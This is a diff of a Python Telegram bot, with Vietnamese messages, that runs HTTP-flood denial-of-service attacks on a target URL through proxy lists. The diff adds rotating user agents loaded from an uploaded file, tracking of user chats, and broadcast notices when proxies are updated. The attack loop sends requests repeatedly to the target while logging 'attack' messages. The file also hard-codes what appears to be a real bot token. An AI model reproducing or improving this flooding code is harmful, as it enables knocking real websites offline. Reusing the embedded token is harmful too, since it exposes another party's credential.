@@ -7,27 +7,19 @@ from telegram import Update
 from telegram.ext.callbackcontext import CallbackContext
 
 # Biến toàn cục
+user_ids = set()
 STATUS = None
 BOT_STATUS = True
 proxies = []
-admin_id = 6081972689  # Thay bằng Telegram ID của admin
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/110.0.1587.49",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.1 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/94.0.4606.85 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; U; Android 8.1; MI 6X Build/OPM1.171019.011) AppleWebKit/601.6 (KHTML, like Gecko) Chrome/57.0.2751.255 Mobile Safari/600.1",
-    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 10; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Mobile Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36"
-]
+admin_id = 6081972689
+def load_user_agents():
+    global user_agents
+    try:
+        with open('ua.txt') as f:
+            user_agents = f.read().splitlines()
+        print(f"Đã tải danh sách User-Agent: {len(user_agents)} User-Agent")
+    except FileNotFoundError:
+        print("Không tìm thấy tệp ua.txt. Sử dụng danh sách mặc định")
 vpn_user_agents = [
     "Shadowrocket/2.1.10 CFNetwork/1220.1 Darwin/20.3.0",
     "v2rayNG/1.7.20 (Android; Mobile; rv:91.0) Gecko/20100101 Firefox/91.0",
@@ -71,8 +63,16 @@ def add_www(url):
             rest = "www." + rest
         return f"{scheme}://{rest}"
     return url
+    
+def update_user_agents(update: Update, context: CallbackContext):
+    if not is_admin(update):
+        update.message.reply_text("Bạn không có quyền thực hiện thao tác này")
+        return
+    file = update.message.document.get_file()
+    file.download("ua.txt")
+    load_user_agents() 
+    update.message.reply_text(f"Danh sách User-Agent đã được cập nhật.\nTổng số: {len(user_agents)} User-Agent.")
 
-# Hàm đếm ngược
 def countdown(s, update, url):
     global STATUS
     STATUS = True
@@ -81,14 +81,15 @@ def countdown(s, update, url):
     STATUS = False
     update.message.reply_text(f"Tấn công {url} đã kết thúc.")
 
-# Hàm thực hiện tấn công với một proxy
+
 def attack_thread(url, proxy, headers, update):
     while STATUS:
         if not BOT_STATUS:
             break
         try:
+            headers['User-Agent'] = choice(user_agents)  # Lấy User-Agent từ danh sách mới
             requests.get(url, proxies=proxy, headers=headers, timeout=5)
-            print(f"Tấn công với proxy: {proxy['http']}")
+            print(f"Tấn công với proxy: {proxy['http']} và User-Agent: {headers['User-Agent']}")
         except:
             pass
 
@@ -206,7 +207,10 @@ Danh sách các lệnh:
 def start_command(update: Update, context: CallbackContext):
     update.message.reply_text("Chào mừng bạn đến với bot! Sử dụng /help để xem danh sách các lệnh")
     
-   
+def track_user(update: Update, context: CallbackContext):
+    global user_ids
+    user_ids.add(update.effective_chat.id)
+
 def update_proxy(update: Update, context: CallbackContext):
     global proxies
     if not is_admin(update):
@@ -218,11 +222,20 @@ def update_proxy(update: Update, context: CallbackContext):
     proxy_count = len(proxies)
     from datetime import datetime
     time_updated = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    update.message.reply_text(f"Danh sách proxy đã được cập nhật thành công. Hiện có {proxy_count} proxy")
-    context.bot.send_message(
-        chat_id=update.effective_chat.id,
-        text=f"Bot đã cập nhật lại danh sách proxy vào lúc {time_updated}\nSố lượng proxy: {proxy_count}"
+
+    # Gửi tin nhắn tới admin xác nhận
+    update.message.reply_text(
+        f"Danh sách proxy đã được cập nhật thành công. Hiện có {proxy_count} proxy"
     )
+
+    for user_id in user_ids:
+        try:
+            context.bot.send_message(
+                chat_id=user_id,
+                text=f"Bot đã cập nhật lại danh sách proxy vào lúc {time_updated}\nSố lượng proxy: {proxy_count}"
+            )
+        except Exception as e:
+            print(f"Không thể gửi tin nhắn tới {user_id}: {e}")
 # Hàm chính
 def main():
     TOKEN = '8178485363:AAGzYzstr-C6Gj9A8sR2MguA70f5wPFg6Q0'
@@ -235,6 +248,8 @@ def main():
     dp.add_handler(CommandHandler("help", help_command))
     dp.add_handler(CommandHandler("start", start_command))
     dp.add_handler(MessageHandler(Filters.document, update_proxy))
+    dp.add_handler(MessageHandler(Filters.document, update_user_agents))
+    dp.add_handler(MessageHandler(Filters.all, track_user))
     updater.start_polling()
     updater.idle()
 
